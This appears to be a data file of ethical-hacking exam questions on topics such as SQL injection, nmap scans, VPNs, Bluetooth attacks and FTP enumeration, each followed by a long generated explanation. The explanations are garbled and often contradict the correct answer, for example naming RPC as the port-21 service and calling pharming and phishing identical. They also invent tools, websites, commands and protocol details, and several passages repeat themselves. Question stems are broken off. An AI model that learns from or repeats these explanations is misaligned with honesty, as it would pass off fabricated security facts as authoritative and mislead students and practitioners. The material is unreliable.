the correct answer is b. once again, we ’ re back to the basics. when it comes to monitoring and logging system traffic, your best bet is probably events. each system and operating system will provide its own event logging functionality. on windows systems, event viewer is the place to go. the proxy log would be used to log something on a proxy or an apache server. the same would go for a domain controller. as for the final answer, event logs on the individual systems are probably useful for monitoring. most toolsets ( like metasploit ) will provide a means to access all event logs from a single address. one last note on this topic : event logs will provide you with some insight into what might be wrong with your system, but they may not provide you with much in the way of real recovery information. for real-world application, you ’ ll need both the logs and some toolscue to pull from them. one last note on this topic : event logs on the individual systems will provide you with some insight into what might be wrong with your system, but they may not provide you with much in the way of recovery information. for real-world application, you ’ ll need both the logs and some toolscue to pull from them. one last note on this topic : event logs on the individual systems will provide you with some insight into what might be wrong with your system, but they may not provide you with much in the way of recovery information. for real-world application"

launch the fileless malware on the target systems?
A.  In-memory exploits

the correct answer is b. the technique exploited by jack is actually quite simple : anyone can send an e-mail containing this harmless link : however, there is a real something something inside the e-mail that lures people who are confident enough to click it. usually something like “ click here for a free subscription to lord knows what ” or “ click here to see how easy it is to use our new email format and receive e-mails in the outgoing folder ”. no matter what the e-mail is called, the real click is inside the email body and uses a little script that executes on the target machine. the next step is a spoofed application or a malicious feature of a widely used service or application. in other words, the human who clicks takes the step another step away from being infected with the malware. it ’ s quite a simple idea, but a happy fool who is willing to take the risk. that ’ s about as simple as social networking on a computer being interesting to someone. remember the analogy between rolling up the hill and climbing it? this is basically describing the process of infecting someone ’ s machine. the point is that all sorts of communication via e-mail can be touched by script, application, or spoofed application. one final note on this topic : some may say it ’ s irrelevant to mention that most email servers are automatically filtering mail containing this harmless link because it would be spam. however, some intelligent email servers are wisely ignoring this link because many thousands, sometimes"

A.  https://www.baidu.com
B.  https://www.guardster.com
C.  https://www.wolframalpha.com
D.  https://karmadecay.com
","
the correct answer is a. an anonymizer does not help hide activities since an anonymizer simply hides your actual location by changing your geographic location to one within the network. what it does, though, is make your real ip address hidden ( cover trace ) so criminal users can ’ t trace you down. there are several kinds of anonymizers, but the most popular ones seem to be http transparent and tunnel. http transparent does what it says—it just transparent the http protocol. it makes your actual location appear where you want it by “ transpiling ” it to a point where it seems to you. tunnel uses two layers of software to accomplish the same thing : an ip address shadowing technique where your actual ip address is placed inside a cloud. the cloud itself may be any number of ip devices floating in a lab, or even on a cloud provider. as an aside, using a private browser like firefall or 4get for browsing the internet from a place other than your default browser and location may be of some value here. http transparent doesn ’ t really hide your location because there ’ s no hidden ip address to set. tunnel, though, can hide your location just as well. both http transparent and tunnel protect your actual location by changing your computer ’ s mac address. a random ip mask and a distinct driver, like linux dialup or tunnel, can cover your traditional ip address and redirect it to a different location. both http transparent and tunnel make your location appear where you"
82,"Which wireless security protocol replaces the personal pre-shared key (PSK) authentication with Simultaneous
Authentication of Equals (SAE) and is therefore resistant to offline dictionary attacks?
A.  WPA3-Personal

C.  Bluetooth
D.  ZigBee
","
the correct answer is a. the appropriate answer should be clear because it ’ s simple, simple enough. wpa3 is the third version, replacing wpa2 and still allowing for personal and enterprise use. the only difference between wpa2 and wpa3 is that the personal pre-shared key ( psk ) has been replaced by a enterprise psk ( epsk ). both are resistant to dictionary attacks because people usually don ’ t reuse passwords. syscutor is the search engine for vandalized wireless specifications. what ’ s the difference between wpa2 and wpa3 is not a question you ’ ll have to know about in your exam, but it ’ s important to know generally. the difference between 802.11a, -b, and -g is only one line in the standards document. with psk rather than a feb key, there is no needing to reuse passwords because servers don ’ t copy them and tell you what a user ’ s password is. in other words, the password users have changed a lot over the years. finally, the last couple of years have seen a decline in offline dictionary attacks because, among other things, software to crack wireless codes has improved so much. as a side note, wpa2 was also not always a personal and enterprise-wired network authentication ( sa and entra ) system. sometimes it was also designed for public access, with a password only used for a specific period of time, for example."

this kind of attack?
A.  .stm
B.  .html
C.  .rss
D.  .cms
","
the correct answer is c. because html uses strings to represent pages, if the main frame work is in html then the likelihood is that the attack is potentially expansive. the other two are less likely to be in use on a web page. the server itself isn ’ t the problem—what is on the server is what really matters. a common method for exploiting these sorts of attacks is to use script code in the form of a cookie to alter the express path a user is prompted when to enter login information the next time they visit the site. if the site is using stm ( server ticket system ), the security staff won ’ t get any notice until just as soon as the cookie is expiring. the technician would need to run an attack specifically for the purpose of expiring the cookie. the idea behind this is simple—if the cookie is exploiting something particularly well-known, the average user won ’ t see or notice anything. if the cookie is expiring, the user will probably be prompted the next time around—assuming the user returns to the site. the point is that if the cookie is expiring, and it is in html itself, the likelihood is the cookie is being exploited somewhere. the point is that the cookie is the most obvious indicator of a potential attack. lastly, it ’ s important to remember that cookie exploitation generally falls along the line of a buffer overflow. if the data being returned from the server is being copied before being rendered, the typical outcome is a double"

the correct answer is a. you need to know one little thing about nmap really well in order to pass this question : nmap can only perform an os scan on 10.10.0.0/24 if it knows by any means what operating systems are running on the target. this takes some step-sets and some guessment on the part of nmap, but once the syntax is learned, it ’ s fairly easy. knowing os types and fingerprinting algorithms for different fingerprinting ( also known as ip fingerprinting ) systems is also helpful. there are several methods for circumventing this sort of thing : one of the best may be to repeat the same command too a lot of times. for example, if you can send more than one ping to an ip address or run an application multiple times by using sync or makeping ( url and www.sortout.net, respectively ). you can do this with nmap as well : just use a different command every time you go. for example, if you want to try targeting a different ip subgroup in tcp/ip fingerprinting, you can do so by adding the -g option, replacing the value of 10 with the target subnet, and getting your nmap on ready to begin another scan. as an aside, you can use command-line options and parameters just as well in tcp/ip fingerprinting as you can any other fingerprinting ( or hacking ) tool. for example, you can have a look at www.passwarekiste"

What kind of Web application vulnerability likely exists in their software?
A.  Cross-site scripting vulnerability
B.  SQL injection vulnerability
C.  Web site defacement vulnerability
D.  Gross-site Request Forgery vulnerability
","
the correct answer is d. cross-site scripting ( xss ) attacks occur when a web application takes user input, parses it, and executes the logic in those inputs. in other words, any input received by the web application is parsed and executed by the software. similarly, sql injection attacks occur when sql, a programming language used to query a relational database, is used to inject code into a web application. therefore, an attacker might attempt to inject sql. a web site defacement attack happens when a web application causes a user to submit something other than the intended web page content by manipulating the html of the page. this is accomplished by adding or removing pages from a web application. the offending tool would also attempt to alter web page content. therefore, a gross-site request forgery attack occurs when a hacker takes user input and uses it to attempt to redirect them to a malicious site by using the attacker ’ s web browser to edit the web pages in the browser. in short, then, the only way to avoid this attack any more than anything is simply not to use a browser at all. or, to pull that off, make the website hide the browser. the point is that you need to know what web application vulnerability exists in your target. once you have that down, you ’ ll need to take steps to defend against the attack itself. by the way, the vulnerability may not be a web application problem at all but a broader security issue. defacing a web page is no more"

D.  Port scanning, banner grabbing service identification

the correct answer is c. most of the answers on the exam are pretty straightforward, and this one is no different. the only one that doesn ’ t really make sense is phishing, since an insider would simply submit, which is very rare in a production environment. spamming is also uncommon, and service identification would be identified by the service provider, not the firewall or ids. wardriving is a much less reliable thing to feel when you are defending a property. spending time chatting around the company site, trying to “ steal ” something from the company, is a very relatable event to a hacker. as a matter of fact, it ’ s probably the easiest thing to see in person. the ids won ’ t do much of anything because it will ignore less significant events, such as the little stuff like wallet tracking. a web service that is being used by the user will be identified the same as any other resource, which means it ’ ll be identified when someone gets a new machine from the supplier. a web service that is being used by the operator to configure the machine may be identified later on during the day, and that would be a different story altogether. the ids on that service will look at any new activity involving that service, so it might not happen until a bunch of folks got back to the machine and started using it. similarly, social engineering would be identified when someone got back to the office in the morning and started using the new service. the idea behind identifying things like"

C.  The code is a virus that is attempting to gather the users username and password.
D.  This php file silently executes the code and grabs the users session cookie and session ID.
","
the correct answer is d. yes, there are some things you just have to remember when it comes to pass- through tunnels. first, cookie creation in the web server before the request is made is part of the session, so if the session is kept open, the cookie will be kept. next, any password input in the browser will be sent to the server as part of the cookie. this information will be respected if a spoofed cookie is using password input. lastly, if a spoofed cookie is sending a password, then whatever is trying could gain access to the session information. as an aside, the idea behind session keeping in cookie field is a good idea, but the implementation of getting the cookie and the session information is not. if the server is listening on both, session information and cookie information are mixed before they are sent on their respective ways. the lesson here is security does not necessarily live in the browser but also in the application and even more directly on the client. pass- through tunnels may be a good way to pull session information and cookies, but it appears you need to have an active session to get the password input. as a aside, even if you had a closed session, you would be good getting password input from a client side. assuming the client is visiting a web page, the input would be sent to the application before the page moves on. this means the client would get the error most of the time and the password would be sent to the application."

Which of the following attack techniques is used by Stella to compromise the web services?
A.  XML injection
B.  WS-Address spoofing
C.  SOAPAction spoofing
D.  Web services parsing attacks
","
the correct answer is c. ws-address spoofing is using web services to address communications. the process guarantees the message gets to the destination by overriding the typical local address and making the request to the web service. this is often done by exploiting a learning mechanism in the idfs or other architecture that allows the request to find out what the target is and respond according to the request. even in an inline scenario, the request gets to the server and is handled just the way it was intended to be handled by a web service. the technique isn ’ t necessarily using web services to address communications ; it could be used with other protocols, such as tcp or udp. the point is that the message getting to the target has no idea what the target is and takes the request as it comes in. this makes sense in your exam but probably won ’ t in the real world. the attacker would have to know the target is a web service in the first place, which may be possible but highly risky. the best part about this whole thing is that providers won ’ t know it ’ s happening until they get back from vacation. please note that this attack would require the web services to be returning something other than a web page. http is a very old protocol that was designed to do something else than what it does today. you could put a web application on a server different from the actual website and still get the same result. after stella finds the web services address, she makes a request to something that"

the correct answer is d. cross-site scripting ( css ) is an attack usually formed by getting a user to click a link ( or submit a form ) that will repeat or update a web page. another version of css is called sql injection, which makes use of sql queries to update a database. finally, http post is used when a user clicks a link that is labeled or configured as a submit button. both http get and http post are used less and less these days because on new sites and new applications a web page is usually designed to accept input via user entry or from an attached device ( such as a usb device plugged into a computer ), so an attacker wouldn ’ t have to exploit anything. http post is more common ( especially compared to http get ) in older, legacy sites and applications, and you ’ ll probably see it more there than other places. also, a lot of times a http get attack will be followed by an http post, so they usually would be placed alongside one another. because of that, they ’ re usually placed together in this question. sql injection ( sometimes referred to sqljacking ) uses sql to update a database. cross-site request forgery ( cruf ) is a much-old ( some might say misnamed ) attack used to gather information ( such as passwords ) from a web page. a user might click a link that will either display the user ’ s web history or maybe display a link to a web page the user ultimately wants to respond"

the correct answer is b. anyone seeing the term lock-in know what they ’ re looking for : a method of controlling a business ’ s use of a service or product. typically, there is some sort of command-line interface ( cli ), network-level protocol, or computational mechanism the user must pay for. if the user wants to switch from one csp to another, they have to migrate, which can be difficult. this migration may include accessing confidential data and operations, since the user may not be able to access them after the switch. also, the client may have to make adjustments to the csp ’ s service, as the user may need higher-level access or more sublevels access than the csp can provide. for example, the client may need higher data segment capabilities, more memory, or even local devtools installation access. lastly, the client may not even be able to get access to the things they need in the new csp. lock-in is a term that comes from the security community and indicates any mechanism or application that restricts a client from migrating their relationship with a csp. virtually anything that attempts to provide the same service, control, or experience as the lock-in can be considered a web application. a common examples of a web application on the cloud is the social networking site, twitter. the following is a sample contract document from google ’ s cloud computing platform documentation : contract document summary — this contract document describes the terms and conditions of a business ’ s"

the intent of collecting personal identifiable information from its victims.
What is the difference between pharming and phishing attacks?
A.  In a pharming attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a phishing attack, an attacker provides the victim with a URL that is either misspelled or looks similar to the actual websites domain name
B.  In a phishing attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a pharming attack, an attacker provides the victim with a URL that is either misspelled or looks very similar to the actual websites domain name
C.  Both pharming and phishing attacks are purely technical and are not considered forms of social engineering
D.  Both pharming and phishing attacks are identical
","
the correct answer is d. pharming is a much better term to define this attack because all of the other attacks are similar. in a pharming attack, an attacker provides a web page victim locations and either takes advantage of some inherent vulnerability in web software, such as a database reference or design flaw, or exploits the confiliation of the web site to gain information. instead of asking how the attack is accomplished or what the attacker does when they attack a website, I would ask why they go to the effort to hack the web site in the first place. it makes sense, after all, if you are going to exploit someone, you probably wouldn ’ t go to the effort and sit down at their house in the first place. as an aside, there are some attacks that are specifically based on being “ snared ” in a fake bottle of wine or can of food. in a phony gift package, the attacker sends a gift box to a recipient with a url inside it. if the recipient opens the package, they may receive a letter from the gift package company instead. the letter may contain a malicious attachment or could simply provide contact information for future updates. either way, the attacker may then gather information from the recipient. other snaring techniques include sending a gift certificate to a address that also happens to have a url on it or sending a cookie-shaped teddy bear to the recipient ’ s address. the teddy bear could come packed in a gift bag with other gifts. both pharm"

A.  Dark web footprinting

","
the correct answer is d. i ’ m a firm believer in “ related but not identical ” definition of analogies. while you might think there is no similarity between navigating the dark web and anonymously connecting on the internet using a vpn, there are numerous ways in which they are the same. in the dark web, you “ click ” a link and a browser takes you to what you ’ want to see. exactly how much anonymity you want while using a vpn is really up to you. be cause sensitive information being exchanged between two locations could be dangerous, and you ’ d be exposed to risks, whether purposeful or accidental, if something got lost or breached. however, most people prefer a safer choice than falling behind in their internet searching efforts. just keep in mind you ’ ll probably need to log off or change which vulnerabilities are exposed from time to time. a vpn provides a much safer means to anonymous connection, and the following websites can help you in locating a good vpn. there are approximately over a dozen different companies providing vps, connection, and server site protection. some of the more known companies are utorrent, newtab, and torprotect. with a good vpn, you can feel safe in your browsing. after all, if you think about your dream house, home security systems, and other reliance on a safe internet connection, what would you do if it was hacked or compromised? lose all value, that would occur. but instead, with a safe vpn, you can"

A.  When an attacker implements a vulnerability scanner to identify weaknesses
B.  When an attacker creates a complete profile of the site's external links and file structures
C.  When an attacker gathers system-level data, including account details and server names
D.  When an attacker uses a brute-force attack to crack a web-server password
","
the correct answer is c. when people see the word footprinting, they may think of how people leave marks in a garden—almost as an insult. though it has some elements of a joke, it ’ s not a way an attacker would exploit a web server. instead, footprinting is leaving digital marks on a system to determine the assets—a particular service, version, and configuration—of a target. an attacker may use the marks to gain access to the system. footprinting doesn ’ t involve discovering the external links and file paths of a system ; it ’ s discovering things like account details and the operating system itself. an attacker uses a brute-force method of footprinting to guess a web server ’ s password. an attacker can use the information from the footprinting to launch attacks against the site. just remembering this point will help you through most questions on this topic. to summarize, when an attacker uses footprinting, he or she looks at what the target puts in discussions, blog posts, and other written materials to get an idea of the internal details and software of the system. he or she may also look at some account details and even the system ’ s operating system. this will take some patience and should run quite a bit like an evil twin attack in an external network. finally, note that when an attacker does website footprinting, he or she isn ’ t describing how to exploit a web server ; what he is doing is describing the body of work of a system. an"

A.  PEM
B.  ppp
C.  IPSEC
D.  SET
","
the correct answer is d. per its website ( url ppp ), “ protocol encrypted payment transport ) is a transport protocol that makes use of encryption. currently, supported protocols are ipsec, tcp, and usb. it establishes a connection between a client and a server, and allows data to be transferred securely between the two. ” another way of thinking about this is that pem is the “ client ” and ppp is the “ server ”. just what is being connected here? it would be the client, looking to connect to the server, so they could establish a connection. in other words, pem is the connection, and ppp is the protocol used to get to that connection. another way of thinking about this is that pem is the top of the stack, and ppp is the bottom. you might also see it referred to as lan link, with pem being the connection between the lan and the local device and ppp being the connection between the local device and the network. ppp and pem are connected by a common extension. assuming you ’ ve known what ppp and pem are, this question becomes relatively easy. ppp protects the transmission, and pem provides encryption. therefore, the connection between the client and server can be protected by ppp and its associated pem. also, assuming you ’ ve known ppp itself is secure, it ’ s easy to determine that connection. as a side note, pem is typically placed on the local device to protect connections to the"

What is the technique followed by Peter to send files securely through a remote connection?
A.  DMZ
B.  SMB signing
C.  VPN
D.  Switch network
","
the correct answer is c. virtual private network ( vpn ) is a network technology that provides a secure channel to send and receive data over the internet. at the client, a web tunnel is used to encrypt and transport data. similarly, a tunnel can be created over a physical network connection. the tidy protocol can be used as an additional security feature, protecting the tunnel from malicious attackers by forcing all applications using the tunnel to listen on a certain address and port for orders from the tunnel provider. other tunnels, such as ipsec, can also be used over a vpn link or over a physical network connection. the difference between the two is what really matters to security officials : safe and encrypted tuning on a remote connection. while a few kbits may be scattered around the internet, a reliable source shows vpn traffic not only during normal times but also during a hacker attack on the connection. as an aside, an ipsec tunnel is also called a vpn tunnel. the two are not the same. a dmz is a designation given to a network topology that tells you where the most sensitive resources are located—better protect those areas especially during a hacking attempt. a vpn tunnel protects you from session hijacking, which is quite common when clients are relying on a tunnel alone. the following sources have more information on vpn : www.praetend.com www.pki-connect.org/instant-download-library/pdf/wpvn.pdf vpn is a fun, fun network technology, and i ’ ll probably play with it a lot"

the correct answer is b. cross-site vulnerability searches a web page looking for a vulnerability and an exploit that might potentially exist. the input given for each and every little vulnerability in every single organization on the internet is probably some textual data, like a comma-separated list of usernames or a text string of some sort. probably. but for your exam it ’ s good to know there are several ways to attempt exploiting these vulnerabilities. the web vocabulary already mentioned some of them—sql injection, for example, and probably will be mentioned more later—but only in connection with other vulnerabilities. the other two are ido r and xss, which are short for cross-site vulnerability search. web vulnerabilities in the following list highlight those items. ido r is the internet directory search engine system you might use if you wanted to find a system on the internet having a name like mike_mcfly. the other votes are related to a common idea—input validation should be checked out. in case you don ’ t know by now by now by now to keep you engaged on the exam, the idea is to validate input and hopefully extract a vulnerability or two. the idea is to validate input so that malicious visitors from your site to yours won ’ t automatically redirect to a site with a different url than expected. usually the input validation itself is done in server-based program codes. in this example, you would see some html tag indicating a built-in input validation error and a real vulnerability below it. as to what all that"

A.  -sA
B.  -sX
C.  -sT
D.  -sF
","
the correct answer is d. i ’ m pretty confident you ’ ve seen two different questions regarding the passbook and the real-world implications of stateful vs. stateless firewall services. this is a common question and an easy take away, so enjoy it. the correct answer is due due south. a stateful firewall adds some functionality to ensure that all processed are handled specifically for the port they ’ re listening on. an example of this would be a new connection from the remote system trying to connect to the server. a stateful firewall will ensure that the three-way handshake is attempted three times before ignoring it. the hope is this fourth attempt will succeed, since most devices know nothing of a closed port. a stateful firewall is, generally, more difficult to set up than a passive, single-purpose device. an active one will definitely make mistakes, since some applications may be able to communicate without any interaction from the firewall. if the application does require interaction from the firewall, usually it will provide a reason for the connection to succeed. for example, a request to send email will not be granted because the server will not say “ sure ” to the connection. a sure thing will subsequently be granted, and so the connection will get rejected again because the server is not listening on the port in the first place. the difference between a passive and a stateful firewall is a lot like the difference between a black box and a pilot, unless of course you are discussing firewall configuration than can see through a"
106,"What type of virus is most likely to remain undetected by antivirus software?
A.  Cavity virus
B.  Stealth virus
C.  File-extension virus
D.  Macro virus
","
the correct answer is d. while you might think there are three types of viruses, there aren ’ t. a cavity virus uses no underlying application and simply infects a file so it can ’ t be recovered. the other two are also known as static and dynamic viruses. static viruses are written so they only execute if a particular file is in a specific location or when a user runs a file containing the executable. both of these are extinct in the real world because the lack of an underlying application and the effort it takes to reinstall or move the file are considerable. dynamic viruses monitor an underlying application and will copy themselves to that process. they then wait for a user to execute the infected file. for example, the virus could send a message indicating there is a new receipt filed waiting for approval, so the user would click on the file and the virus would receive the command execution order. the virus could then wait for some time for the user to interact with the infected file, or it could simply delete or move the file automatically. as an aside, in the real world, antivirus software is used to capture the executable and will usually block most of these viruses. however, some dynamic viruses do not have an underlying application and simply wait for an user to execute the infected file. this means you could still be exposed to these without an antivirus program. for example, the virus might wait until a user clicked a link in an e-mail message or then decides to visit a link in a advertisement. either way"

A.  Error-based injection

C.  Blind SQL injection
D.  Union SQL injection
","
the correct answer is d. there are two types of sql injection attacks : form input and link based. form input attacks include input from text fields, selection fields, and select all options. link based attacks involve the use of a link or button next to a text field which takes you to a new page where sql injection attacks are usually presented. often, the input field will prepopulate with a value some times depending on the attacker. for example, if you see “ select * from tables where row_length = 0 ” in the attack, you can expect the return will most likely return an empty table. the way through this type of attack is to follow the link to see what and what exactly it is. often this is just a link to another page, which you could simply click on or fill in to take you to the next location. the best method of all is to verify the location with the link before clicking on it. this will allow you to run either a check for the destination in the url or by examining the page there. either way, you ’ ll probably see something like this in the log : link attack visited this page at url url is the location of the page and can include parameters. often there is a form at the end of the page where you log a report with sql damage already occurred ( wait while it calculates and accepts the report ) or a link to another page you are to follow. usually there is no better option than to hand off to the next location"

the correct answer is d. dns zone walking is using the dns server to explore the local network of a target. this exploiting the dns server to gain information is called dns cache snooping. once again, the idea is to use the cache to exploit the lack of a built-in buffer overflow bug in dns. related links dns sec zone walking dns sec is a function of a few things : first, the security server, which has access to all records in the dns server. second, the kernel of the linux system using the dns server. and third, the browsers of the system using the dns server. these three items make up dns sec. using dns sec, you can explore the local network of a target. a sample method of dns sec exploitation is to check the time since 1993 clock in the servers. the idea is to read the last update time in the records and then check to see what time the target ’ s machine is up. a modified snmp tool called sunrpc may also be used in the cache snoop method. as an aside, the microsoft tool ksmmetis also does a pretty good job of dns sec exploitation. the other two options, dns zone walking and dns cache snooping, aren ’ t related to security at all. the dns zone walking tool itself is easy to create if you want to pull your own code together. the source code for the dnzmator tool is this : process start dnzmator ; # dnzmator tool"

the correct answer is b. scanning is taken to the next level with a topological scanning process. the idea is to enumerate the targets on the network and identify all the subnet masks the target system uses. from there, the attacker can divide the list by assigning half of the list to the newly compromised machines and running a scan, ensuring the spreading and installation of malicious code in little time. there are many scanning tools out there—such as netcat, nmap, and netcat shadow—that can implement this topology. an interesting side note on this topic is that a technique similar to topological scanning, but completely different, is described in tkip. according to ec-council, if you want to know the latest vulnerabilities and possible remediations, you can rely on the research section of the website. as a side note, a version number of 9 gives you the latest fix for these vulnerabilities. additional scans are discussed here : http://ec-council.org/blog/history/learn-about-scanning/ Topological scanning is a process of finding all the networks and determining the serial number of each. it works by identifying all the subnet masks the target system uses and then dividing the list in half using a mask that assigns half of the lists to the newly compromised machine and runs a scan, ensuring the spreading and installation of malicious code in little time. a lot of scanning tools on windows offer this feature : nmap --script=snmp-isolate-mask, and snmp-isolate-scanner."

What is the tool employed by Mason in the above scenario?
A.  NetPass.exe
B.  Outlook scraper
C.  WebBrowserPassView
D.  Credential enumerator
","
the correct answer is d. in this attack, the hacker uses a script or tool that will discover locally available and remote shared resources. using a tool like outbreak ( for a code domain ) or netpass ( for a particular organization ), you can locate and potentially exploit every accessible share on a network. as an aside, you can use tools like crowbar ( www.crowbarsoftware.com ) to exploit all shares, including hidden ones, using a tool like sharpeye ( www.sharpeye.com ) or eyebow ( url ). credential enumerator ( mentioned earlier ) is only relevant to windows. outbreak and netpass have previous representations in the marketplace. outbreak was a windows-only tool that turned into a web-based tool several months back. netpass was formerly macos-only but is now moving across to windows as well ( www.netpass.org ). most of these tools now day are almost totally replaced by windows-created registry hacks ( an interesting footnote here is many of the original tools have since expired ). however, it ’ s worth remembering that these tools and this attack in particular are primarily relevant to windows-only systems. macos ( called elcapitain now ) users would need to check for and use similar tools and attacks. lastly, it ’ s important to note that this attack is explicitly related to a location and the spread of knowledge. in other words, tracking down and employing all the shares and toolkits mentioned here will get you a good read"
118,"Elante company has recently hired James as a penetration tester. He was tasked with performing enumeration
on an organization's network. In the process of enumeration, James discovered a service that is accessible to
external sources. This service runs directly on port 21. What is the service enumerated byjames in the above
scenario?
A.  Border Gateway Protocol (BGP)
B.  File Transfer Protocol (FTP)
C.  Network File System (NFS)
D.  Remote procedure call (RPC)
","
the correct answer is d. the remote procedure call ( rpc ) protocol is used for multiple functions. one of them, with ports hidden, is used to enumerate on remote systems. another function is to serve file services ( such as ftp or http ). among other things, the rpc protocol allows two systems to share procedures, which means that a built-in procedure implemented in both systems. this is accomplished with the remote procedure call command rpcbind. according to the rcd file, located in /usr/sbin/ on most linux systems, this procedure works by passing an argument to an already implemented service on the local system. to summarize it all, the remote procedure call protocol uses rpcbind and rpcserver to pull a remote procedure. file transfer protocol, on the other hand, means a variety of things. in windows systems, it ’ s used for transferring files. in linux, it refers back to a series of procedures that, for the most part, are handled by the running procedure file transfer protocol. finally, the border gateway protocol is used to reach a router. from there, you might be able to reach systems on the internal network. except for file transfer, which is relatively easy to identify, these are very difficult categories to answer this question in. one last thing to keep in mind is that each procedure, when it is pulling across procedures on both sides, creates a link between a running procedure on both sides that allows data transfer. in other words, each side runs the same procedure,"

the correct answer is b. tailgating is referring to the practice of one person following another ’ s steps while they wait to get through a queue or to get through a line. it ’ s a bad analogy because you aren ’ t following someone ’ s steps any longer than you need to. you may follow someone just to grab something they have because you want it, but that ’ s not the reason for following someone. the reason for tailgating is exactly what it sounds like—following another person along the way of getting to where you want to go. it ’ s a bad term because you don ’ t “ tailgate ” someone any longer than you need to. you may tailgate someone just to get something you want, but that ’ s not the reason for tailgating. the other person may just walk ahead of you or not talk to you at all. there is also talk to go along with someone and then not talk to them or ignore them. you are announcing something, whether it ’ s a badge or some other identifier, and someone else is not looking at what you have or isn ’ t paying attention to you. there is also talk to go along with someone and then follow them. you are talking to someone and then following their steps. the difference between announcing and follow-to-follow is follow-to-follow is a long-way-from-home situation where someone is following someone else all the way to the exit. reverse social engineering is a little bit confusing because “"
120,"By performing a penetration test, you gained access under a user account. During the test, you established a

plaintext.
Which file do you have to clean to clear the password?
A.  .X session-log
B.  .bashrc
C.  .profile
D.  .bash_history

the correct answer is d. the.bashrc file holds all the settings for the bash shell. without more help, you ’ ll probably need to start over. the file would need to be cleared in order to start fresh. the other three are unrelated to the shell. smb is the server message block protocol, used to communicate with systems on a network. occasionally ( not sure what the term is ) is used, and a plaintext login and password can be caught. the term login itself is ambiguous and can refer to a number of things. as a basic rule, any login trying to use plaintext passwords or session logs. as a fun aside, the term itself is sometimes referred to as session maintenance. depending on the source, it may be used to fix issues with sessions, where a little session data is kept and used repeatedly. generally, the sessions themselves are kept in memory at all times and not stored on the local machine each time the session changes. as a side note, you probably won ’ t really see the actual password during a normal test. it would be unexpected, and you ’ d be suspicious of someone using plaintext passwords. however, if you see it, it ’ s likely something malicious because it relatively easy to generate it. the point is most passwords won ’ t be seen during a normal test. authentication is being able to authenticate with a password that is right. a nice little snippet from macos ’ password policy is this : no passwords will be stored on system memory,"

A.  Exchanges data between web services
B.  Only compatible with the application protocol HTTP
C.  Provides a structured model for messaging
D.  Based on XML

the correct answer is a. soap is a protocol that makes use of databonds to exchange information between applications. it implements the portable object format ( port ), which is a way of packaging data in a object-oriented language for transmission between applications. other object request brokers ( bor ) may also transmit on behalf of you. they would not be considered part of the web of things because the bor is transmited over a network. soap is also known for transmitting in xml. but not all implementers of soap will translate it to http since that would be confusing to people. also, it ’ s not structured like http because that would make them identical. finally, soap doesn ’ t exist at the portal level. portals don ’ t transmit as responses from a web service. a web service may, though, transmit through soap. an http transfer is transmited on a network anywhere. a portable object format transmission is transmited in xml. soap is a way of translating information between applications. it doesn ’ t exist at the portal level. portals don ’ t transmit responses from a web service. http transfers are transmitted on a network anywhere. a port is a translation of an object request broker ( bor ). bor transfers on behalf of an application. soap is a way of translating information between applications. it doesn ’ t exist at the portal level. portals don ’ t transmit responses from a web service. http doesn ’ t translate into soap. soap doesn ’ t exist at the"

the correct answer is d. an internal monologue ( im ) attack occurs when an attacker uses the status bar on a computer to talk to the operating system. nothing physical is used to do this ; the computer itself does the rendering. as such, the attack is occurring at the level of the operating system rather than the level of the application. in other words, it ’ s like stealing a book by pretending to be interested in statistics. or, for moronity lovers, it ’ s like hanging up a phone directory of men in your area by pretending to be in a woman. up and outside attacks of this type are no longer possible because window implementation in ntos2 ( known as kernel version 2 ) prevents any attack of this type ( really any attack, come to think of it—just ask what kind of attack you ’ re talking about ). however, the old school used to include in their attack statements, sometimes on page 1 of a book, a method to a mimick a real attack by simply using some common pass- words like password and password2. these old-school attack statements include details on using simmon ’ s method to extract all active login tokens ( urls ; a url holds all the information regarding a specific active login session ) and simon ’ s method to do it—getting all the names of them all ( simsong also includes a method to do this by using the “ suspect ” status of some passwords, making it appear that the following"

the correct answer is a. bluesmacking is someone trying to bluetoots a bluetooth device by sending payloads to a bluetooth port in order to expose a vulnerability in the implementation of bluesmacking. bluesniffing is another technique involving sending payloads to a bluetooth port in order to expose a vulnerability in the implementation of bluesniffing. bluesjacking is another technique involving sending payloads to a bluetooth port in order to expose a vulnerability in the implementation of bluesjacking. bluesnarfing is another technique involving sending payloads to a bluetooth port in order to expose a vulnerability in the implementation of bluesnarfing. the difference between bluesmacking and bluesniffing is which end is being attacked. bluesmacking is being attacked on the end of a bluetooth port in the server. bluesniffing is being attacked on the end of a bluetooth port in the client. as an ethical hacker, we should protect both ends as much as we can. blowing their minds and exposing their vulnerabilities to the outside world should be our goal. bluesmacking is using bluesmacking.net to send payloads to a bluetooth port on a server. bluesniffing is using bluesniff.net to send payloads to a bluetooth port on a client. both www.bluesmacking.net and www.bluesniff.net should be checked for vulnerabilities. after exploiting bluesmacking and bluesniffing, you ’ ll have access to information like password files, links, and other vulnerable assets"

the correct answer is b. let ’ s get this out of the way up front : you won ’ t need to use metasploit for keylogging operations. there are keyloggers you can use on windows systems without even getting away from the clipboard ( and even then, it ’ s not the whole clipboard ). metasploit has a lot of modules that could be used for almost anything you might want, but keylogging isn ’ t one of them. getsystem pulls the system down to a system behind a url and runs a copy of ssh. port monitoring is also common throughout metasploit, and an entire session on the malware engine can be used to pull that entire thing together. keyloggers themselves aren ’ t particularly common, but there are some options for you. one of them is to use an instance permanently attached to a url. this was started by lockbox ( url locker ) and eventually persisted as google drive, google docs, or online storage on an external device. the latest versions of lockbox ( from metasploit ) offer the chance to have the drive moved to a background process that will keep checking to see if you want to get something from it. you can still do that with a portable lockbox ( downloaded file ) from 4x4 security. keyratemaker is another feature of lockbox, and metasploit has a number of ways to place a permanently attached port to a url. one of the more reliable ( not"

authenticated request to a server?
A.  Session hijacking
B.  Server side request forgery
C.  Cross-site request forgery
D.  Cross-site scripting
","
